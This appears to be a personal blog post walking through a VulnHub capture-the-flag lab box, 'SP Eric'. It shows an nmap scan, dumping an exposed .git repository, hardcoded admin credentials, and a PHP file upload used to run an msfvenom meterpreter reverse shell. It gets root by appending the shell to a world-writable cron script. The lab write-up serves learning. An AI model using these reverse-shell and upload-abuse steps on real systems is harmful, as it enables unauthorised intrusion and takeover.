@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="My write-up for SP Eric, a VulnHub box created by Dsolstad.">
+    <title>VulnHub: SP Eric | ben-dale.co.uk</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="/">~/ben-dale.co.uk</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tags/">~/tags</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/rss</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">VulnHub: SP Eric</span></h1>
+
+<h2 class="date">2020/02/09</h2>
+<p class="terms">
+  
+  
+  
+  
+  Tags: <a href="/tags/git">git</a> <a href="/tags/ssh">ssh</a> <a href="/tags/msfvenom">msfvenom</a> <a href="/tags/metasploit">metasploit</a> 
+  
+  
+</p>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <p>This weekend I managed to fully root a <a href="https://www.vulnhub.com">VulnHub</a> box without looking at another person&rsquo;s write-up for a hint, for the first time! This box was created by <a href="https://dsolstad.com/vm/2019/03/09/Vulnerable-machines.html">Daniel Solstad</a> and can be downloaded <a href="https://www.vulnhub.com/entry/sp-eric,274/">here</a>. Here&rsquo;s my write-up.</p>
+<h3 id="write-up">Write-up</h3>
+<p>The description for this box states:</p>
+<pre><code>Eric is trying to reach out on the Internet, but is he following best practice?
+Flags:
+- /root/flag.txt
+- /home/eric/flag.txt
+</code></pre><p>Once I had Eric set up and running I ran a port scan:</p>
+<pre><code>kali@kali~/Documents/vulnhub/eric$ nmap -sC -sV -o nmap 10.0.2.17
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 16:13 EST
+Nmap scan report for 10.0.2.17
+Host is up (0.00038s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d3:79:15:3d:11:4c:af:26:6c:b2:af:6a:0b:99:14:fd (RSA)
+|   256 87:48:76:38:81:c2:a0:50:cd:4c:39:c0:7c:7a:07:40 (ECDSA)
+|_  256 8e:b9:dd:8d:14:9b:e3:63:1d:d7:0e:54:98:8d:29:5b (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-git: 
+|   10.0.2.17:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: minor changes 
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Blog under construction
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Port 80 was exposed and Nmap also found a Git repository under <code>10.0.2.17:80/.git/</code>. Before I interrogated the git repository I took a look at what was running port 80.</p>
+<p><img src="/static/sp-eric/1.png" alt=""></p>
+<p>Viewing the source confirmed this was just some static placeholder content.</p>
+<p><img src="/static/sp-eric/2.png" alt=""></p>
+<p>It was time to take a look at that Git repo. Heading over to <code>10.0.2.17/.git</code> gave me a 403 so I did some research and came across of set of <a href="https://github.com/internetwache/GitTools">useful scripts</a>, one of which &ldquo;can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled&rdquo;. I cloned the repo and ran the script:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/eric$ /opt/GitTools/Dumper/./gitdumper.sh http://10.0.2.17/.git/ git
+###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+
+
+[*] Destination folder does not exist
+[+] Creating git/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[+] Downloaded: objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249
+[+] Downloaded: objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c
+[+] Downloaded: objects/31/33d44be3eebe6c6761b50c6fdf5b7fb664c2d8
+[+] Downloaded: objects/3d/8e9ce9093fc391845dd69b0436b258ac4a6387
+[+] Downloaded: objects/f0/d95f54335626ce6c96522e0a9105780b3366c5
+[+] Downloaded: objects/c0/951efcb330fc310911d714acf03b873aa9ab43
+[+] Downloaded: objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8
+[+] Downloaded: objects/e7/ba67226cda1ecc1bd3a2537f0be94343d448bb
+</code></pre><p>Running <code>git status</code> in the dumped repository showed two files: <code>admin.php</code> and <code>index.php</code>.</p>
+<pre><code>kali@kali:~/Documents/vulnhub/eric/git$ git status
+On branch master
+Changes not staged for commit:
+  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)
+  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)
+        deleted:    admin.php
+        deleted:    index.php
+
+no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
+</code></pre><p>Running <code>git reset --hard</code> put the repo into a clean working state. I looked inside <code>admin.php</code> and found some useful information:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/eric/git$ cat admin.php 
+&lt;?php
+
+ob_start();
+session_start();
+
+if ($_POST['submit']) {
+    if ($_POST['username'] == 'admin' &amp;&amp; $_POST['password'] == 'st@mpch0rdt.ightiRu$glo0mappL3') {
+        $_SESSION['auth'] = 1;
+    } else {
+        exit(&quot;Wrong username and/or password. Don't even bother bruteforcing.&quot;);
+    }
+}
+
+// Todo: Make sure it is only allowed to upload images.
+if ($_POST['submit_post']) {
+    if (move_uploaded_file($_FILES['image']['tmp_name'], 'upload/' . $_FILES['image']['name'])) {
+    }
+}
+ 
+?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;admin login&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;?php
+if (!isset($_SESSION['auth'])) {
+?&gt;
+&lt;form action=&quot;admin.php&quot; method=&quot;post&quot;&gt;
+&lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;Username&quot; /&gt;
+&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot; /&gt;&lt;br /&gt;
+&lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Login&quot;/&gt;
+&lt;/form&gt;
+
+&lt;?php
+} else {
+?&gt;
+
+&lt;h1&gt;Add new post (under construction)&lt;/h1&gt;
+&lt;form action=&quot;admin.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input name=&quot;post_title&quot; type=&quot;text&quot; placeholder=&quot;Title&quot;&gt;&lt;br /&gt;
+&lt;textarea name=&quot;post_body&quot; cols=&quot;40&quot; rows=&quot;3&quot; placeholder=&quot;Body&quot;&gt;&lt;/textarea&gt;&lt;br /&gt;
+&lt;input name=&quot;image&quot; type=&quot;file&quot; placeholder=&quot;Image&quot; /&gt; 
+&lt;input type=&quot;submit&quot; name=&quot;submit_post&quot; value=&quot;Upload&quot;/&gt;
+&lt;/form&gt;
+
+&lt;h1&gt;Add site to blogroll&lt;/h1&gt;
+&lt;input name=&quot;blogroll_add&quot; type=&quot;text&quot;/&gt;&lt;br/&gt;
+&lt;input name=&quot;blogroll_submit&quot; type=&quot;submit&quot; value=&quot;add&quot;/&gt;
+
+&lt;?php
+}
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>The two things I noted were:</p>
+<ol>
+<li>Admin credentials hardcoded (<code>admin:st@mpch0rdt.ightiRu$glo0mappL3</code>)</li>
+<li>Some function to allow admin users to upload files to an <code>upload</code> directory.</li>
+</ol>
+<p>Taking a look at <code>admin.php</code> in the browser presented me with a login form:</p>
+<p><img src="/static/sp-eric/3.png" alt=""></p>
+<p>I logged in with the hardcoded credentials I found inside <code>admin.php</code> and was redirected to an admin UI:</p>
+<p><img src="/static/sp-eric/4.png" alt=""></p>
+<p>Most of the screen was labelled &ldquo;(under construction)&rdquo; but reading the source code of <code>admin.php</code> made me think that the file upload mechanism was at least working. To quickly test this out I uploaded a test file (<code>test.txt</code>) that contained the string <code>abc123</code>. Clicking &ldquo;Upload&rdquo; didn&rsquo;t return any noticeable errors so I had a look at <code>10.0.2.17/upload/test.txt</code> and found my file&rsquo;s contents.</p>
+<p><img src="/static/sp-eric/5.png" alt=""></p>
+<p>Because Eric was capable of running and executing PHP, it was likely that I could set up a reverse shell by uploading a payload, executing it and listening out for the connection back from Eric.</p>
+<p>The first step was to generate the payload, configuring the listening host to my machine&rsquo;s IP and listening port to some arbitrary port that wasn&rsquo;t used on my machine, in this case, 4000.</p>
+<pre><code>kali@kali:~/Documents/vulnhub/eric$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=4000 -o shell.php
+/usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 30685 bytes
+Saved as: shell.php
+</code></pre><p>The next step was to run the multi/handler exploit from <code>msfconsole</code> to listen out for the incoming connection from Eric:</p>
+<pre><code>msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp
+payload =&gt; php/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) &gt; set LPORT 4000
+LPORT =&gt; 4000
+msf5 exploit(multi/handler) &gt; set LHOST 10.0.2.15
+LHOST =&gt; 10.0.2.15
+msf5 &gt; run
+</code></pre><p>The final step was to upload <code>shell.php</code> and to visit <code>10.0.2.17/upload/shell.php</code> to execute the script. Once the script had executed I flipped back to <code>msfconsole</code>, saw that I had a connection and started poking around:</p>
+<pre><code>meterpreter &gt; ls
+Listing: /var/www/html/upload
+=============================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  30685  fil   2020-02-08 17:04:35 -0500  shell.php
+100644/rw-r--r--  7      fil   2020-02-08 16:51:39 -0500  test.txt
+</code></pre><p>I had a look inside <code>/etc/passwd</code> and found a user named &ldquo;eric&rdquo;, as previously hinted at in the description for the box.</p>
+<pre><code>root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin❌2:2:bin:/bin:/usr/sbin/nologin
+sys❌3:3:sys:/dev:/usr/sbin/nologin
+...
+eric❌1001:1001:,,,:/home/eric:/bin/bash
+sshd❌106:65534::/run/sshd:/usr/sbin/nologin
+</code></pre><p>Inside <code>/home/eric</code> I found the first flag:</p>
+<pre><code>meterpreter &gt; cd /home/eric
+meterpreter &gt; ls -al
+Listing: /home/eric
+===================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  81     fil   2018-12-23 12:02:47 -0500  .bash_history
+100644/rw-r--r--  220    fil   2018-10-28 07:53:24 -0400  .bash_logout
+100644/rw-r--r--  3771   fil   2018-10-28 07:53:24 -0400  .bashrc
+40700/rwx------   4096   dir   2018-10-28 09:00:02 -0400  .cache
+40775/rwxrwxr-x   4096   dir   2018-10-28 09:00:11 -0400  .local
+100644/rw-r--r--  807    fil   2018-10-28 07:53:24 -0400  .profile
+100644/rw-r--r--  0      fil   2018-10-28 09:26:18 -0400  .sudo_as_admin_successful
+100777/rwxrwxrwx  93     fil   2018-10-28 09:27:43 -0500  backup.sh
+100644/rw-r--r--  31239  fil   2020-02-09 09:57:01 -0500  backup.zip
+100644/rw-r--r--  13     fil   2018-10-28 09:29:18 -0400  flag.txt
+
+meterpreter &gt; cat flag.txt
+89340a834323
+</code></pre><p>I also found an interesting couple of files: <code>backup.sh</code> and <code>backup.zip</code>. I didn&rsquo;t know what <code>.sudo_as_admin_successful</code> was, but it didn&rsquo;t have any content so I just left it. Looking inside <code>backup.sh</code> I found the following:</p>
+<pre><code>meterpreter &gt; cat backup.sh
+#!/bin/bash
+zip -r /home/eric/backup.zip /var/www/html
+</code></pre><p>Given the contents of <code>backup.sh</code> and the last modified date of <code>backup.zip</code>, one could presume that <code>backup.sh</code> is running on a cronjob periodically. At least, that&rsquo;s what I presumed. I tried looking around for the running cronjob configuration but because I was running as user <code>www-data</code> and (again, presumably) the cronjob was set up on either <code>root</code> or <code>eric</code> I didn&rsquo;t have permission to view the config. Either way, something somewhere was executing <code>backup.sh</code> every few minutes. I also noticed that <code>backup.sh</code> had all the perms, which meant I had permission to write to it.</p>
+<p>I decided to set up another reverse shell, this time on port 7000, that would be initiated by <code>backup.sh</code>. I made a copy of the previously uploaded shell (located under <code>/var/www/html/upload/shell.php</code>) and changed the listening to 7000.</p>
+<p>I added the following line to <code>backup.sh</code> so that when it was executed <code>shell_7000.php</code> would be executed and a reverse shell would be initiated:</p>
+<pre><code>php -f /var/www/html/upload/shell_7000.php
+</code></pre><p>I went back to msfconsole and moved my current meterpreter session to the background, changed the listening port to 7000, and ran the listener again:</p>
+<pre><code>meterpreter &gt; background
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) &gt; set LPORT 7000
+LPORT =&gt; 7000
+msf5 exploit(multi/handler) &gt; run
+</code></pre><p>After a few minutes a connection was initiated:</p>
+<pre><code>[*] Started reverse TCP handler on 10.0.2.15:7000 
+[*] Meterpreter session 2 opened (10.0.2.15:7000 -&gt; 10.0.2.17:55208)...
+</code></pre><p>I dropped into a shell and found that I was running as the <code>root</code> user:</p>
+<pre><code>meterpreter &gt; shell
+Process 995 created.
+Channel 0 created.
+whoami
+root
+
+cat flag.txt
+6a347b975dd18ae6497c
+</code></pre><h3 id="final-thoughts">Final thoughts</h3>
+<p>I had a lot of fun working through this box, and I&rsquo;m having a lot of fun learning about a whole new area of expertise. A number of times I was left scratching my head trying to figure out the next steps, sometimes stepping away for an hour or so, or coming back to it the next morning. I pressed on and eventually managed to get to a solution.</p>
+<p>As a programmer I know the value in stepping away from a problem for a bit, going for a walk or grabbing some food, waiting for that &ldquo;eureka&rdquo; moment. It turns out it&rsquo;s just as applicable in this context too!</p>
+
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/ben-dale">Github</a> | <a href="https://keybase.io/mrbenjamind">Keybase</a> | <a href="https://twitter.com/mrbenjamind">Twitter</a>
+      
+    </footer>
+    
+  </body>
+</html>
+
